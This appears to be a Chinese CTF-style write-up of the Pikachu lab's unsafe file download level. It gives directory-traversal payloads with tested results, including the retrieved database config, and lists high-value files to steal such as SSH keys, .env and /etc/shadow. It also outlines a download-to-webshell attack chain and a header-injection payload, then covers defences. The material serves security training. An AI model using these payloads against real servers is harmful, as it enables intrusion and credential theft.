---
layout: post
title: Pikachu - Unsafe Filedownload Writeup（任意文件下载与跨盘符限制）
platform: pikachu
date: 2026-10-29 20:15:00 +0800
categories: CTF
---

Pikachu - Unsafe Filedownload Writeup（任意文件下载与跨盘符限制）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Unsafe Filedownload → 不安全的文件下载
- 地址：`http://localhost/pikachu/vul/unsafedownload/unsafedownload.php`
- 题型：Web
- 考点：**任意文件下载**、目录穿越、下载与包含的区别

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
操作系统：Windows NT（系统盘 C:，phpstudy 装在 D:）
```

**页面形态**：

```text
NBA 1996年 黄金一代

Notice:点击球员名字即可下载头像图片!

[科比] [艾弗森] [纳什] [雷阿伦]
[马布里] [坎比] [斯托贾科维奇] [本华莱士]
[伊尔戈斯卡斯] [费舍尔] [奥尼尔] [拉希姆]
```

**★ 每个名字都是一个下载链接**：

```html
<a href="execdownload.php?filename=kb.png">科比.布莱恩特</a>
<a href="execdownload.php?filename=ai.png">阿伦.艾弗森</a>
...
```

**作者提示**：

```html
data-content="我就说一句,1996年的状元是艾弗森,但是下面这个列表里面kobe排在第一位,你说奇怪不奇怪吧。"
```

**★ 这段提示只是"闲话"**（1996 年状元确实是艾弗森，但页面把 Kobe 排第一）—— 和漏洞无关。

**✅ 实测结果（6 种 payload）**

| # | `filename` 参数 | 结果 |
|---|---|---|
| 1 | `kb.png` | 21651 字节，`attachment; filename=kb.png` |
| 2 | **`../../../inc/config.inc.php`** | **628 字节 → 数据库配置源码** ✅ |
| 3 | **`../../../index.php`** | **3955 字节 → 首页源码** ✅ |
| 4 | **`../../../inc/mysql.inc.php`** | **1063 字节 → 数据库连接代码** ✅ |
| 5 | **`../../../../../Extensions/php/php7.3.4nts/php.ini`** | **73481 字节 → PHP 全局配置** ✅ |
| 6 | `../../../../../../Windows/win.ini`（6 个 `..`）| **失败**（553 字节 = "文件不存在"提示页）|
| 7 | `C:/Windows/win.ini` | **失败** |

**★ payload 2 拿到的完整内容**：

```php
<?php
//全局session_start
session_start();
//全局居设置时区
date_default_timezone_set('Asia/Shanghai');
//全局设置默认字符
header('Content-type:text/html;charset=utf-8');
//定义数据库连接参数
define('DBHOST', '127.0.0.1');//将localhost或者127.0.0.1修改为数据库服务器的地址
define('DBUSER', 'root');//将root修改为连接mysql的用户名
define('DBPW', 'root');// ★ 数据库密码
define('DBNAME', 'pikachu');//自定义，建议不修改
define('DBPORT', '3306');//将3306修改为mysql的连接端口，默认tcp3306
?>
```

二、题目分析

**① 漏洞代码：一行路径拼接**

```php
<?php
// execdownload.php 第 9-39 行
$file_path = "download/{$_GET['filename']}";          // ★ 直接拼接用户输入
$file_path = iconv("utf-8", "gb2312", $file_path);    // 中文文件名处理

// 首先要判断给定的文件存在与否
if(!file_exists($file_path)){
    skip("你要下载的文件不存在，请重新下载", 'unsafe_down.php');
    return;
}

$fp = fopen($file_path, "rb");
$file_size = filesize($file_path);

ob_clean();                                           // 输出前 clean，否则图片打不开
Header("Content-type: application/octet-stream");     // ★ 告诉浏览器"这是二进制流"
Header("Accept-Ranges: bytes");
Header("Accept-Length:" . $file_size);
Header("Content-Disposition: attachment; filename=" . basename($file_path));   // ★ 触发下载
$buffer = 1024;
$file_count = 0;
while(!feof($fp) && $file_count < $file_size){
    $file_con = fread($fp, $buffer);
    $file_count += $buffer;
    echo $file_con;                                   // ★ 原样输出文件内容
}
fclose($fp);
?>
```

**★ 四个关键点**：

```
① filename 直接拼进路径 → 可以用 ../../ 穿越
② file_exists() 检查 → 路径必须真实存在（不是"随便写都能下"）
③ Content-Disposition: attachment → ★ 浏览器"下载"而不是"显示/执行"
④ 循环 fread + echo → 原样输出文件字节
```

**② ⭐ 核心认知：下载 vs 包含（最容易混的一对）**

**★ 这是本关最重要的知识点。**

**同样的 `../../../inc/config.inc.php`，两种用法结果完全不同**：

| 用法 | 代码 | 结果 |
|---|---|---|
| **文件包含**（上一模块）| `include "../../../inc/config.inc.php"` | **PHP 被执行** → 页面看不到源码 |
| **文件下载**（本关）| `Header("Content-Disposition: attachment")` | **原样下载** → 直接看到源码 |

**★ 为什么**：

```
include：PHP 解释器"读进来并执行"
下载：    PHP 只是"把字节发出去"，加个 header 让浏览器存盘
        ★ 全程没有"执行"这一步
```

**★ 所以**：

```
想读 PHP 源码 → 用"下载"，不要用"包含"
    ★ 包含会把 PHP 执行掉，啥也看不到
    ★ 下载能得到完整的源码文本
```

**★ 反过来**：

```
想执行代码 → 用"包含"（LFI），不要用"下载"
    ★ 下载只是把文件给你，不会执行
```

**★ 一句话记忆**：

```
包含 = 让服务器【执行】这个文件
下载 = 让服务器【寄出】这个文件
★ 一个是"吃下去"，一个是"打包寄出去"
```

**③ 目录穿越：层级要数对**

**★ 路径拼接的过程**：

```php
$file_path = "download/" . "../../../inc/config.inc.php"
```

**★ 起点是**：

```
D:\phpstudy_pro\WWW\pikachu\vul\unsafedownload\download\
└─────────────────────┬────────────────────────┘
              cwd + "download/"
```

**★ 逐级往上数**：

```
download\            ← 起点
../                  → unsafedownload\
../                  → vul\
../                  → pikachu\          ★ 这里能读 pikachu 下的文件
../                  → WWW\
../                  → phpstudy_pro\     ★ 这里能读 Extensions\...
../                  → D:\               ★ 到底了
```

**★ 所以**：

```
../../../inc/config.inc.php                    （3 个 ..）  → pikachu\inc\config.inc.php  ✅
../../../../../Extensions/php/.../php.ini      （5 个 ..）  → phpstudy_pro\Extensions\...  ✅
```

**★ 层数写少了会怎样**：

```
filename=../inc/config.inc.php
→ download/../inc/config.inc.php = unsafedownload\inc\config.inc.php
→ 不存在 → 走 file_exists 判断 → 显示"文件不存在"
```

**④ ⭐ 实测发现：Windows 的 `..` 不能跨盘符**

**★ 我试了很多层 `..`，都读不到 `C:\Windows\win.ini`**：

| payload | 结果 |
|---|---|
| `../../../../../../Windows/win.ini`（6 个 `..`）| ❌ 文件不存在 |
| `../../../../../../../../Windows/win.ini`（8 个 `..`）| ❌ 文件不存在 |
| `C:/Windows/win.ini` | ❌ 文件不存在 |

**★ 查一下原因**：

```powershell
D:\Windows 存在: False     ← D 盘根本没有 Windows 目录
C:\Windows 存在: True      ← 系统在 C 盘
```

**★ 结论**：

```
Windows 的 ".." 只能"在同一盘符内向上"
    D:\phpstudy_pro\WWW\...\download\ 往上走，最多到 D:\
    再多的 .. 就"停在 D:\"（不会跳到 C:）
    
★ 所以读不到 C 盘的系统文件
★ 但能读 D 盘上的任何文件
```

**★ 这个限制和 Linux 不同**：

```
Linux 只有一个根 "/"
    /var/www/html/download/../../../../etc/passwd
    → 一路往上到 /，然后 /etc/passwd ✅ 能读

Windows 有盘符
    D:\...\download\../../../../Windows/win.ini
    → 最多到 D:\，然后 D:\Windows\win.ini ❌ 不存在
```

**★ 实战启示**：

```
在 Windows 目标上，穿越能不能"打到系统盘"
取决于"网站装在哪个盘"

· 网站装在 C:\phpstudy_pro\WWW\  → 能一路到 C:\ → 能读系统文件
· 网站装在 D:\phpstudy_pro\WWW\  → 只能在 D 盘内 → 读不到 C 盘
    ★ 但"网站源码 + phpstudy 配置"都在 D 盘 → 依然很严重
```

**⑤ `file_exists()` 的作用**

**★ 它既是"防御"也是"指路牌"**：

```php
if(!file_exists($file_path)){
    skip("你要下载的文件不存在，请重新下载", 'unsafe_down.php');
    return;
}
```

**★ 从攻击者角度看**：

```
· 它告诉我们"路径对不对"
    → 文件存在 → 直接下载
    → 文件不存在 → 调整 ../ 的层数再试
· 这是一个"布尔信号"（存在/不存在）
    → 可以用来"探测服务器上有什么文件"
```

**★ 从防御者角度看**：

```
它只是"避免报错"，不是"安全措施"
★ 它挡不住穿越 —— 因为穿越后的路径也可能真实存在
```

三、解题步骤

**第 1 步：正常下载**

```text
① 打开 http://localhost/pikachu/vul/unsafedownload/unsafedownload.php
② 点"科比.布莱恩特"
③ 浏览器下载 kb.png
```

**★ 看 URL**：

```
execdownload.php?filename=kb.png
                 └───┬───┘
            参数名 filename
```

**★ 说明**：

```
服务器读 download/kb.png
→ 设置 Content-Disposition: attachment
→ 浏览器把内容存成文件
```

**第 2 步：⭐ 穿越下载网站源码**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/config.inc.php
```

**★ 浏览器会下载一个 `config.inc.php`（628 字节）。**

**★ 用记事本打开**：

```php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPW', 'root');          ← ★ 数据库密码
define('DBNAME', 'pikachu');
define('DBPORT', '3306');
```

**★ 注意**：

```
浏览器是"下载"它，不是"显示"它
→ 要在下载目录里找到这个文件，再打开看
★ 因为它带 Content-Disposition: attachment
```

**第 3 步：⭐ 下载 php.ini（更大的情报）**

```
http://localhost/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../Extensions/php/php7.3.4nts/php.ini
```

**★ 下载 73KB 的 php.ini。**

**★ 从中能看到**：

```ini
disable_functions =          ; 哪些函数被禁用
allow_url_include = Off      ; RFI 能不能用
open_basedir =               ; 目录限制
session.save_path = "..."    ; session 存放路径
```

**★ 这些信息决定"下一步能不能打"。**

**第 4 步：⭐ 验证"跨不了盘符"**

**★ 试这两个**：

```
http://localhost/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../../Windows/win.ini
http://localhost/pikachu/vul/unsafedownload/execdownload.php?filename=C:/Windows/win.ini
```

**★ 结果**：都跳到"你要下载的文件不存在，请重新下载"页面。

**★ 这就验证了**：

```
Windows 的 .. 最多到 D:\
D:\Windows 不存在（系统在 C:）
→ 读不到系统文件
```

**★ 再试"多写几层"**：

```
?filename=../../../../../../../../../../../Windows/win.ini
→ 还是失败（多余的 .. 被忽略，停在 D:\）
```

**第 5 步：下载其它有价值的文件**

```
// 首页源码（能看出用了什么框架、有哪些功能）
?filename=../../../index.php

// 数据库连接代码
?filename=../../../inc/mysql.inc.php

// 工具函数（escape、skip 等）
?filename=../../../inc/function.php

// 整个网站的结构（如果知道目录名）
?filename=../../../vul/sqli/sqli_str.php

// phpstudy 的其他配置
?filename=../../../../../Apache2.4.39/conf/httpd.conf
```

**第 6 步：完整 payload 汇总**

```
// ========== 正常 ==========
kb.png

// ========== 穿越读网站源码（同盘符）==========
../../../inc/config.inc.php
../../../index.php
../../../inc/mysql.inc.php
../../../inc/function.php

// ========== 穿越读 phpstudy 配置 ==========
../../../../../Extensions/php/php7.3.4nts/php.ini

// ========== 读系统文件（本环境失败，因为系统在 C:）==========
../../../../../../Windows/win.ini
../../../../../../Windows/System32/drivers/etc/hosts

// ========== 绝对路径（本关不可用，因为前面拼了 download/）==========
C:/Windows/win.ini
```

四、延伸知识

**① 常见的"高价值下载目标"**

**网站自身**：

```
config.php / config.inc.php      ← 数据库密码
.env                             ← 各种密钥（云服务、支付、SMTP）
.git/config                      ← Git 仓库地址和凭据
.git/HEAD                        ← 能配合 .git/index 恢复源码
backup.sql / www.zip / www.rar   ← 整个源码 + 数据库
composer.json / package.json     ← 依赖版本（找已知漏洞）
```

**Web 服务器**：

```
Apache:    conf/httpd.conf
Nginx:     conf/nginx.conf
IIS:       C:\Windows\System32\inetsrv\config\applicationHost.config
```

**PHP**：

```
php.ini                          ← disable_functions / open_basedir
```

**系统**：

```
Windows:   C:\Windows\win.ini
           C:\Windows\System32\drivers\etc\hosts
           C:\Windows\System32\inetsrv\config\...
           C:\Users\<用户名>\.ssh\id_rsa      ← SSH 私钥
Linux:     /etc/passwd
           /etc/shadow              （需 root）
           /root/.bash_history
           /root/.ssh/id_rsa
           /var/log/auth.log
```

**★ 一个"连锁反应"**：

```
下载 .git/config        → 仓库地址 + token
下载 .env               → 云服务 AK/SK
下载 config.php         → 数据库密码 → 连库 → 拖库
下载 id_rsa             → SSH 登录服务器 → 完全控制
★ 文件下载漏洞本身"只读"，但能"读出整个系统的钥匙"
```

**② 下载漏洞的其他形态**

**形态 1：参数直接是文件路径（本关）**

```php
$path = "download/" . $_GET['filename'];
readfile($path);
```

**形态 2：参数是"文件名"，但没过滤**

```php
$file = $_GET['file'];
header('Content-Disposition: attachment; filename=' . $file);
readfile('./uploads/' . $file);
```

**形态 3：`Content-Disposition` 注入**

```php
header("Content-Disposition: attachment; filename=" . $_GET['name']);
```

**★ 如果 name 里有换行符**：

```
?name=test.txt%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>XSS</h1>
→ 响应头被注入
→ 变成反射型 XSS / 响应拆分
★ 现代 PHP 会拦截头部的换行（"Header may not contain more than a single header"）
```

**形态 4：用 `readfile()` + 路径穿越**

```php
readfile($_GET['file']);        // 更简单，连 download/ 前缀都没有
→ ?file=../../../inc/config.inc.php
```

**③ 下载漏洞的"探测"技巧**

**★ 判断"文件存不存在"**：

```
· 存在 → 返回文件内容（或 200 + 文件大小）
· 不存在 → 返回"文件不存在"提示 / 404 / 空响应
★ 这是一个"布尔信号"，可以用来"探测服务器文件系统"
```

**★ 探测举例**：

```
?filename=../../../inc/config.inc.php          → 存在（Pikachu 一定用了配置文件）
?filename=../../../.git/config                 → 存在？（如果用了 git 部署）
?filename=../../../../../../Windows/win.ini     → 不存在（本环境）
★ 根据"存在/不存在"就能画出服务器的目录结构
```

**④ 和"文件包含"的配合**

**★ 两个漏洞经常同时存在（同一套代码风格）**：

```
下载 → 读源码，找"包含点"和"上传点"
包含 → 执行代码
上传 → 投放代码
★ 三个漏洞串联 = 完整的 getshell 链
```

**★ 典型组合**：

```
① 下载 config.php        → 拿数据库密码
② 下载 index.php         → 看路由逻辑
③ 发现 include($_GET['page'])  → LFI
④ 发现 upload.php 上传点  → 传图片马
⑤ 用 LFI 包含图片马       → 代码执行
⑥ 拿到 webshell          → 完全控制
```

**⑤ 防御**

**❌ 本关的反面教材**：

```php
$file_path = "download/{$_GET['filename']}";
readfile($file_path);
```

**✅ 正确做法 1：白名单（最稳）**

```php
$allowed = ['kb.png', 'ai.png', 'ns.png', 'rayal.png', ...];
$filename = $_GET['filename'] ?? '';
if (!in_array($filename, $allowed, true)) {
    die('非法的文件名');
}
readfile("download/" . $filename);
```

**✅ 正确做法 2：`basename()` 去掉路径**

```php
$filename = basename($_GET['filename']);
// "../../../inc/config.inc.php"  →  "config.inc.php"
readfile("download/" . $filename);
```

**★ 注意 `basename` 的坑**：

```
· Windows 和 Linux 对 \ 和 / 的处理不同
· basename("..\\..\\config.php") 在 Linux 上返回 "..\..\config.php"
  （因为反斜杠不是分隔符）
· 攻击者可以用 \ 绕过
★ 所以 basename 要配合"只允许字母数字"的校验
```

**✅ 正确做法 3：映射表（ID → 文件）**

```php
$map = ['1' => 'kb.png', '2' => 'ai.png', ...];
$id = $_GET['id'] ?? '';
if (!isset($map[$id])) die('非法');
readfile("download/" . $map[$id]);
```

**★ 最彻底**：

```
请求里根本不出现"文件名"
→ 攻击者连"猜"都无从下手
```

**✅ 正确做法 4：把文件放在 Web 目录之外**

```
D:\phpstudy_pro\uploads\      ← 不在 WWW 下
D:\phpstudy_pro\WWW\         ← Web 根目录

★ 文件放在 Web 根目录外 → 没法直接 URL 访问
★ 只能通过"下载脚本"读，而脚本做白名单校验
```

**✅ 正确做法 5：`open_basedir` 限制**

```ini
open_basedir = D:/phpstudy_pro/WWW/pikachu/
```

**★ 能防住"读网站目录外的文件"，但防不住"读网站内文件"。**

**⑥ 本关在真实世界的对应**

**★ 常见的"文件下载功能"**：

```
· 下载附件 / 下载报表 / 下载导出文件
· 下载头像 / 下载图片
· 下载日志（运维后台）
· 下载证书 / 下载密钥
```

**★ 这些都是"下载漏洞"的高发点**：

```
只要"文件名来自用户输入" + "没有白名单"
→ 就能穿越
```

**★ 真实案例**：

```
· 某 OA 系统 ?file=../../../../etc/passwd
· 某 CMS 的 "下载模板" 功能能读 config.php
· 某网盘的 "下载分享" 能穿越到服务器任意文件
```

五、总结

- **本题核心：`$file_path = "download/{$_GET['filename']}"` 直接拼接 → 可以用 `../` 穿越下载任意（同盘符）文件。**

- **一行漏洞代码 + 一行"打包寄出"**：

```php
$file_path = "download/{$_GET['filename']}";                       // ★ 零过滤
Header("Content-Disposition: attachment; filename=" . basename($file_path));   // ★ 触发下载
```

- **⭐ 八个必记要点**：

```text
① 下载 vs 包含（最重要）
   include → 执行 → PHP 源码看不到
   download → 原样发字节 → 能拿到完整源码
   ★ 想读源码用"下载"，想执行代码用"包含"

② 层级要数对
   起点是 ...\unsafedownload\download\
   ../../../  → pikachu\        （读网站源码）
   ../../../../../ → phpstudy_pro\  （读 Extensions）

③ Windows 的 .. 不能跨盘符 ★ 实测发现
   D:\... 最多到 D:\，不会跳到 C:\
   本环境 D:\Windows 不存在 → 读不到 win.ini
   ★ 网站装在哪个盘，决定了能读到什么

④ file_exists() 不是防御
   它只是"避免报错"，并且给攻击者一个"存在/不存在"的信号
   ★ 可以用来探测服务器文件

⑤ 高价值目标
   config.inc.php → 数据库密码
   .env → 云服务密钥
   .git/config → 代码仓库
   id_rsa → SSH 私钥
   ★ 文件下载"只读"，但能读出"整个系统的钥匙"

⑥ Content-Disposition 是"下载"的关键
   没有它 → 浏览器会尝试"显示"
   有它 → 强制存盘
   ★ 这也意味着"Pikachu 不会执行 PHP"，正好方便读源码

⑦ 真实形态多样
   参数直接是路径（本关）
   参数是文件名但没过滤
   Content-Disposition 头注入
   readfile() 直接读

⑧ 防御：白名单 > 映射表 > basename > open_basedir
   ★ 白名单是唯一"绕不过"的方案
```

- **实测数据**：

```text
kb.png                                            → 21651 字节 PNG
../../../inc/config.inc.php                       → 628 字节（DBPW: root）★
../../../index.php                                → 3955 字节
../../../inc/mysql.inc.php                        → 1063 字节
../../../../../Extensions/php/php7.3.4nts/php.ini  → 73481 字节 ★

../../../../../../Windows/win.ini（6 个 ..）        → 553 字节（文件不存在）
../../../../../../../../Windows/win.ini（8 个 ..）   → 553 字节（文件不存在）
C:/Windows/win.ini                                → 553 字节（文件不存在）

原因实测：
    D:\Windows 存在: False
    C:\Windows 存在: True
    → Windows 的 .. 不能跨盘符
```

- **进度**：

```text
platform: pikachu   31 篇

├── 暴力破解        4/4    ✅
├── CSRF            3/3    ✅
├── XSS            10/10   ✅
├── SQL 注入       10/10   ✅
├── RCE             2/2    ✅
├── File Inclusion  2/2    ✅
└── Unsafe Filedownload 1/1 ✅  ← 刚完成
```

**手工复现要点**：

```text
· 点"科比" → 下载 kb.png（正常）
· 地址栏：?filename=../../../inc/config.inc.php → 下载 628 字节
· 记事本打开 → 看到 DBPW: root
· 地址栏：?filename=../../../index.php → 下载首页源码
· 地址栏：?filename=../../../../../Extensions/php/php7.3.4nts/php.ini → 下载 73KB
· 地址栏：?filename=../../../../../../Windows/win.ini → 文件不存在（跨盘符失败）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  不安全的文件下载 = "服务器帮你寄任意文件"                       │
│                                                            │
│  download/{$_GET['filename']}                              │
│      → filename=../../../inc/config.inc.php                │
│      → 拿到数据库密码                                        │
│                                                            │
│  ★ 和"文件包含"的区别：                                       │
│      包含 = 执行（读不到 PHP 源码）                            │
│      下载 = 原样发出（能读完整源码）                            │
│                                                            │
│  ★ Windows 的 .. 不能跨盘符（实测 D 盘到不了 C 盘）             │
│  ★ 下载漏洞"只读"，但能读出配置、密钥、源码 → 危害很大           │
│  ★ 防御：白名单 / 映射表（别让请求里出现文件名）                 │
└────────────────────────────────────────────────────────────┘
```
